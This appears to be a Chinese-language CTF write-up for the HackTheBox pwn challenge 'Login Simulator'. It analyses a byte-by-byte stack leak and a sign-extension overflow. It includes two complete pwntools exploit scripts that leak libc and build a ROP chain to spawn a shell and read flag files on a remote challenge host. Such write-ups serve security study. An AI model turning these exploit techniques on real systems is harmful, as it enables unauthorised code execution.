
---
title: HTB-Login Simulator-pwn-challenge-wp
categories: [CTF,HTB]
tags: [pwn]

---
一道意义题，让我学会了很多...比如明白了大佬总再说“F5 只是看乐子，干正事还是得看汇编”<!--more-->

## 程序流程分析

题目开了PIE 、canary，NX保护。

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc'

程序的mian函数伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // eax
  char v5; // [rsp+7h] [rbp-A9h]
  int v6; // [rsp+8h] [rbp-A8h]
  int v7; // [rsp+Ch] [rbp-A4h]
  char v8; // [rsp+10h] [rbp-A0h]
  unsigned __int64 v9; // [rsp+A8h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v5 = 0;
  setup(*(_QWORD *)&argc, argv, envp);
  banner();
  while ( 1 )
  {
    menu();
    if ( (signed int)__isoc99_scanf("%d", &v6) < 0 )
    {
      puts("Something went wrong.\n");
      return 1;
    }
    if ( v6 == 3 )
      return 0;
    if ( v6 > 3 )
      break;
    if ( v6 == 1 )
    {
      v7 = register(&v8);
      if ( v7 < 0 )
        return 1;
      v5 = 1;
    }
    else
    {
      if ( v6 != 2 )
        break;
      if ( v5 == 1 )
      {
        login((const struct utmp *)&v8);
        if ( v4 )
          puts("Good job! :^)");
        else
          puts("Invalid username! :)");
      }
      else
      {
        puts("You need to register first.");
      }
    }
  }
  puts("Invalid option.\n");
  return 1;
}
```

程序的主要逻辑简单，主要是注册（register）、登录（login）及退出（exit）3个功能。

我们进行跟进注册（register）可以看到：

```c
signed __int64 __fastcall register(__int64 a1)
{
  signed __int64 result; // rax
  unsigned int v2; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("{i} Username length: ");
  if ( (signed int)__isoc99_scanf("%d", &v2) >= 0 )
  {
    if ( (signed int)v2 > 0 && (signed int)v2 <= 128 )
    {
      printf("{i} Enter username: ", &v2);
      getInput(a1, v2);
      puts("Username registered successfully!");
      result = v2;
    }
    else
    {
      puts("Invalid length.");
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    puts("Something went wrong!");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

虽然，函数对我们输入的数据有合法的限制，但检测的是我们输入的数据长度。导致我们输入的数据可以小于我们原本设置的输入数据大小。

于是跟进到login函数：

```c
void login(const struct utmp *entry)
{
  unsigned int v1; // esi
  char s1; // [rsp+10h] [rbp-A0h]
  unsigned __int64 v3; // [rsp+A8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("{i} Username: ");
  getInput(&s1, v1);
  strncmp(&s1, (const char *)entry, (signed int)v1);
}
```

在login函数的检测中，v1是由我们输入的“数据长度”。但我们实际的输入数据没那么多，导致可能我们泄露栈上数据。

## 程序漏洞

### UAF

我们分析getInput函数，getinput的作用是将数据一个一个字符写入：

```c
unsigned __int64 __fastcall getInput(__int64 a1, signed int a2)
{
  char buf; // [rsp+16h] [rbp-Ah]
  char i; // [rsp+17h] [rbp-9h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; a2 > i && (signed int)read(0, &buf, 1uLL) > 0; ++i )
  {
    if ( buf != 0x20 )
    {
      if ( buf == 0xA )
        return v5 - __readfsqword(0x28u);
      *(_BYTE *)(a1 + i) = buf;
    }
  }
  return v5 - __readfsqword(0x28u);
}
```

我们乍看，可以没用什么问题。用于输入的第二参数在调用前就被我们严格的限制。

但是在对字符串处理时，对0x20对应的字符' '(空格)执行跳过，导致栈上原本存放的数据继续保留下来。

再加上之前，login的验证功能，导致我们可以一个个把部分栈上数据泄露出来。

### 溢出

再回到getInput函数，看反汇编代码看不出毛病，但是审计汇编代码：

```assembly
  0x00005630ed0c92fd <+0>:     push   rbp
   0x00005630ed0c92fe <+1>:     mov    rbp,rsp
   0x00005630ed0c9301 <+4>:     sub    rsp,0x20
   0x00005630ed0c9305 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00005630ed0c9309 <+12>:    mov    DWORD PTR [rbp-0x1c],esi
   0x00005630ed0c930c <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00005630ed0c9315 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x00005630ed0c9319 <+28>:    xor    eax,eax
   0x00005630ed0c931b <+30>:    mov    BYTE PTR [rbp-0x9],0x0
   0x00005630ed0c931f <+34>:    jmp    0x5630ed0c936f <getInput+114>
   0x00005630ed0c9321 <+36>:    lea    rax,[rbp-0xa]
   0x00005630ed0c9325 <+40>:    mov    edx,0x1
   0x00005630ed0c932a <+45>:    mov    rsi,rax
   0x00005630ed0c932d <+48>:    mov    edi,0x0
   0x00005630ed0c9332 <+53>:    mov    eax,0x0
   0x00005630ed0c9337 <+58>:    call   0x5630ed0c9070 <read@plt>
   0x00005630ed0c933c <+63>:    test   eax,eax
   0x00005630ed0c933e <+65>:    jle    0x5630ed0c937a <getInput+125>
   0x00005630ed0c9340 <+67>:    movzx  eax,BYTE PTR [rbp-0xa]
   0x00005630ed0c9344 <+71>:    cmp    al,0x20
   0x00005630ed0c9346 <+73>:    je     0x5630ed0c9364 <getInput+103>
   0x00005630ed0c9348 <+75>:    movzx  eax,BYTE PTR [rbp-0xa]
   0x00005630ed0c934c <+79>:    cmp    al,0xa
   0x00005630ed0c934e <+81>:    je     0x5630ed0c937d <getInput+128>
   0x00005630ed0c9350 <+83>:    movsx  rdx,BYTE PTR [rbp-0x9]
   0x00005630ed0c9355 <+88>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00005630ed0c9359 <+92>:    add    rdx,rax
   0x00005630ed0c935c <+95>:    movzx  eax,BYTE PTR [rbp-0xa]
   0x00005630ed0c9360 <+99>:    mov    BYTE PTR [rdx],al
   0x00005630ed0c9362 <+101>:   jmp    0x5630ed0c9365 <getInput+104>
   0x00005630ed0c9364 <+103>:   nop
   0x00005630ed0c9365 <+104>:   movzx  eax,BYTE PTR [rbp-0x9]
   0x00005630ed0c9369 <+108>:   add    eax,0x1
   0x00005630ed0c936c <+111>:   mov    BYTE PTR [rbp-0x9],al
   0x00005630ed0c936f <+114>:   movsx  eax,BYTE PTR [rbp-0x9]
   0x00005630ed0c9373 <+118>:   cmp    DWORD PTR [rbp-0x1c],eax
   0x00005630ed0c9376 <+121>:   jg     0x5630ed0c9321 <getInput+36>
   0x00005630ed0c9378 <+123>:   jmp    0x5630ed0c937e <getInput+129>
   0x00005630ed0c937a <+125>:   nop
   0x00005630ed0c937b <+126>:   jmp    0x5630ed0c937e <getInput+129>
   0x00005630ed0c937d <+128>:   nop
   0x00005630ed0c937e <+129>:   nop
   0x00005630ed0c937f <+130>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00005630ed0c9383 <+134>:   sub    rax,QWORD PTR fs:0x28
   0x00005630ed0c938c <+143>:   je     0x5630ed0c9393 <getInput+150>
   0x00005630ed0c938e <+145>:   call   0x5630ed0c9050 <__stack_chk_fail@plt>
   0x00005630ed0c9393 <+150>:   leave
   0x00005630ed0c9394 <+151>:   ret
```

重点是这一个部分：

```assembly
   0x00005630ed0c9350 <+83>:    movsx  rdx,BYTE PTR [rbp-0x9]
   0x00005630ed0c9355 <+88>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00005630ed0c9359 <+92>:    add    rdx,rax
   0x00005630ed0c935c <+95>:    movzx  eax,BYTE PTR [rbp-0xa]
   0x00005630ed0c9360 <+99>:    mov    BYTE PTR [rdx],al
```

这段的本意是，完成反汇编代码` *(_BYTE *)(a1 + i) = buf;`的作用，即，将一个字符放该存放它的地方，形成字符串。

但是由于使用了`movsx` 和`movzx`两个指令，这两指令都是[数据传送](https://baike.baidu.com/item/数据传送/500685)指令MOV的变体。`movsx`是带符号扩展，并传送。`movzx`是无符号扩展，并传送.因此在处理一些数据时，会有不同的表现。

例如：

```assembly
MOV BL,80H
MOVSX AX,BL

mov BL, 80H
MOVZX AX, BL
```

运行完以上MOVSX指令语句之后，AX的值为FF80H。由于BL为80H=1000 0000，最高位也即符号位为1，在进行带符号扩展时，其扩展的高8位均为1，故赋值AX为1111 1111 1000 0000，即AX=FF80H。而在运行完以上MOVZX指令语句之后，AX的值为0080H。由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H。

这特性导致，若在题目中中[rbp-0x9]中为0x80时， `movsx  eax,BYTE PTR [rbp-0x9]`执行后，eax值是`0xffffffffffffff80`而非`0x80`.导致在执行`add    rdx,rax`时rdx相加的不是0x80而是`0xffffffffffffff80`.导致在`rbx+0xffffffffffffff80`写入了数据。

同理，在判断循环（` for ( i = 0; a2 > i && (signed int)read(0, &buf, 1uLL) > 0; ++i )`）是否结束是也用了` movsx `指令

```assembly
   0x00005630ed0c9369 <+108>:   add    eax,0x1
   0x00005630ed0c936c <+111>:   mov    BYTE PTR [rbp-0x9],al
   0x00005630ed0c936f <+114>:   movsx  eax,BYTE PTR [rbp-0x9]
   0x00005630ed0c9373 <+118>:   cmp    DWORD PTR [rbp-0x1c],eax
```

由于是带符号比较，`0x80`(正数)是肯定大于`0xffffffffffffff80`(负数)。**导致我们可以在输入0x80个字符后，继续写入字符。**



## 漏洞利用

### leak addr

通过gdb我们可以发现，在login函数栈上残留了`_IO_2_1_stdout_`的数据和一个ELF段的地址。![image-20220404112731311](image-20220404112731311.png)

我们可以利用在register写入猜测的地址数据和数据长度，即构造恶意数据长度为已知道的数据+一位猜测数据，通过login来一个个检验我们猜测是否准确。这样通过strncmp检测，若我们猜测数据对了则显示login成功，未猜对就显示失败。

这样我们慢慢leak出`_IO_2_1_stdout_`的地址，由`_IO_2_1_stdout_`是glib上的函数，我们间接得到了libc的base addr和 system等libc函数的地址和one_getgad的地址。

我们通过一个ELF段的地址上的地址，从而间接得到程序ELF段的基础地址，从而推测出bss段或某一个可写地址的大概位置。

### 栈溢出

之前我们知道getInput，有溢出的可能。经过gdb发现。getInput+`0xffffffffffffff80`的位置恰好，离rbp和返回地址很近。

![image-20220404152704003](image-20220404152704003.png)



同时在getinput中我们的空格会保留栈上原本的数据。这样我们可以通过一定空格来到rbp和返回地址附近。从而，复写返回地址劫持rip，控制程序流。

## exp_local

因此流程下来的exp，

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/12/14 09:59:41
@Author  :   lexsd6
'''


from pwn import * 
#from libcfind import *

local_mote=1
elf='./loginsim'
e=ELF(elf)
#context.log_level = 'debug'
#context.arch=e.arch
ip_port=['167.99.205.117',30301]

debug=lambda : gdb.attach(p) if local_mote==1 else None


def add(mun,text):
    p.sendline('1')
    #sleep(0.2)
    p.recvuntil('{i} Username length:')
    p.sendline(str(mun))
    p.recvuntil('{i} Enter username:')
    p.sendline(text)
    
def login(text):
    #sleep(0.2)
    p.sendline('2')
    p.recvuntil('{i} Username:')
    p.send(text)


def gess_libc(n):

    #debug()
    for i in range(0x100):
        #i=0xff-i
       # sleep(0.1)
        add(0x20+n,'w'*0x20+'w'*(n-1)+chr(i))
       # sleep(0.2)
        p.recvuntil('->')
       
       #print(i)
       # sleep(0.1)
        login('w'*(0x20+n-1)+'\n')
        line=p.recvline()[:-1]
                    #print(i)
        if line!=' Invalid username! :)':
                        print(hex(i))
                        return i
    
    return 0xa
def gess(n):
    #debug()
    for i in range(0x100):
        #i=0xff-i
       # sleep(0.1)
        add(0x20+n,'w'*0x20+'w'*(n-1)+chr(i))
       # sleep(0.2)
        p.recvuntil('->')
       
       #print(i)
       # sleep(0.1)
        login('w'*(0x20+n-1)+'\n')
        line=p.recvline()[:-1]
                    #print(i)
        if line!=' Invalid username! :)':
                        print(hex(i))
                        return i
    
    return 0xa

def link():
    x=0
    k=0x100
    for i in range(6):
        x=x+gess(i+1)*k
	#debug()
        k=k*0x100
        log.info(hex(x//0x100))
    print(hex(x//0x100))
    return x//0x100

def elf_link():
    x=0
    k=0x100
    for i in range(6):
        x=x+gess(i+1+8)*k
	#debug()
        k=k*0x100
        log.info(hex(x//0x100))
    print(hex(x//0x100))
    return x//0x100

"""
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""
#while True:
#    try :
if local_mote==1 :
            p=process(elf)
else :
            p=remote(ip_port[0],ip_port[-1])
if True:
        stdout_addr=link()
        #x=finder('_IO_2_1_stdout_',stdout_addr,num=1)
        elf_base=elf_link()-0x25fe
        libc_base=stdout_addr-0x1ec6a0
        system_addr=0x000000000055410+libc_base
        gets_addr= 0x86af0+libc_base
        puts_addr=0x0000000000875a0+libc_base
        rsi_ret=0x0000000000027529+libc_base
        rdi_ret=0x0000000000026b72+libc_base
        
        bin_sh_addr=elf_base+0x4000+0x100
        ret=0x0000000000025679+libc_base
        log.info('bin_sh_addr:'+hex(bin_sh_addr))
        log.info('libc_base'+hex(libc_base))
        log.info('elf_base:'+hex(elf_base))
        #debug()
        p.recv(timeout=4)
        p.sendline('1')
        p.sendline(str(0x80))#'z'*0x60+'j'*(0x100-0x20))
        p.recv()
        p.sendline('w'*(0x40)+chr(0x20)*0x78+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(puts_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(system_addr))
        sleep(0.5)
        p.sendline('/bin/sh\x00')
        p.interactive()    

```

## remote_problem

看上面最初exp时间，可以看到我很久就在本地解决出来但是什么最近才打通远程呢？

根本原因是netwrok，与htb靶机交换时间太长。这是一个非常影响体验感的问题。在远程中出错也无法即时排查。(ps:应该给个dockerfile)

其次，我leak数据过多了，不仅要leak libc地址，还有leak elf的地址。我在想只需要libc地址。同时，由于不了解自身本地环境与远程机的寄存器和栈环境，是否完全相同也无法轻易使用 one_gadget 。但查阅资料发现libc中自身存在一个`/bin/sh`后门字符串。我们可以通过libc-database来查询得到这个地址，当然也可以用ROPgadget来找到这个地址。

```
ROPgadget --binary ./glibc/libc.so.6  --string '/bin/sh'
Strings information
============================================================
0x00000000001b75aa : /bin/sh

```

于是我用我写的工具libcfind([LibcSearcher_plus](https://github.com/lexsd6/LibcSearcher_plus))来自动查询libc-database，验证本地与远程libc环境是否相同。

同时，我们用libc中自身存在一个`/bin/sh`后门字符串，就不需要leak 程序的基地址只需要libc的基础地址。

由于就算开了PIE与NX，一个libc函数在x64在一位一定是`\x7f`,末位一定是固定的。这样我们就可以少leak俩个位。加上不leak 程序的基地址。我们现在只需要leak 4位数大幅减少leak时间。让我们有更多机会试one_gadget 和system地址对齐的错。

## remote_exp

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-



from pwn import * 
from libcfind import *

local_mote=1
elf='./loginsim'
e=ELF(elf)
#context.log_level = 'debug'
#context.arch=e.arch
ip_port=['167.99.205.117',30301]

debug=lambda : gdb.attach(p) if local_mote==1 else None




def add(mun,text):
    p.sendline('1')
    #sleep(0.2)
    p.recvuntil('{i} Username length:')
    p.sendline(str(mun))
    p.recvuntil('{i} Enter username:')
    p.sendline(text)
    
def login(text):
    #sleep(0.2)
    p.sendline('2')
    p.recvuntil('{i} Username:')
    p.send(text)


def gess(n):
    if n==6:
        return 0x7f  
    if n==1:
        return 0xa0
       

    #debug()
    for i in range(0x100):
        #i=0xff-i
       # sleep(0.1)
        add(0x20+n,'w'*0x20+'w'*(n-1)+chr(i))
       # sleep(0.2)
        p.recvuntil('->')
       
       #print(i)
       # sleep(0.1)
        login('w'*(0x20+n-1)+'\n')
        line=p.recvline()[:-1]
                    #print(i)
        if line!=' Invalid username! :)':
                        print(hex(i))
                        return i
    
    return 0xa

def link():
    x=0
    k=0x100
    for i in range(6):
        x=x+gess(i+1)*k
	#debug()
        k=k*0x100
        log.info(hex(x//0x100))
    print(hex(x//0x100))
    return x//0x100

"""
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""
while True:
    try :
        if local_mote==1 :
            p=process(elf)
        else :
            p=remote(ip_port[0],ip_port[-1])
        stdout_addr=link()
        x=finder('_IO_2_1_stdout_',stdout_addr,num=1)
        libc_base=stdout_addr-0x1ec6a0
        system_addr=0x000000000055410+libc_base
        puts_addr=0x0000000000875a0+libc_base
        #0x0000000000026b72 : pop rdi ; ret
        rdi_ret=0x000000000011c371+libc_base
        sh_addr=0x00000000001b5661+libc_base
        ret=0x0000000000025679+libc_base
        log.info('sh:'+hex(sh_addr))
        log.info(hex(sh_addr))
        log.info(hex(libc_base))
        debug()
        p.recv(timeout=4)
        p.sendline('1')
        p.sendline(str(0x80))#'z'*0x60+'j'*(0x100-0x20))
        rsi_ret=0x0000000000027529+libc_base
        #0x0000000000026b72 : pop rdi ; ret
        rdi_ret=0x0000000000026b72+libc_base
        p.sendline('w'*(0x40)+chr(0x20)*0x78+p64((rdi_ret))+p64(x.dump('str_bin_sh'))+p64(rsi_ret)+p64(0)+p64(ret)+p64(x.dump('system'))+'x'*0x10+
chr(0x0)*8+'\x00'*0x100)#'z'*0x60+'j'*(0x100-0x20))
        sleep(0.5)
	
        print(p.recv(timeout=4))        
        p.sendline('ls')
        print(p.recvline(timeout=2)) 
        #p.interactive()
        p.sendline('cat /home/pwn_login_simulator/f*')
        p.sendline('cat /f*')
        p.sendline('cat fla*')
       
    except:
        p.close()
    else:
        p.interactive()    
```

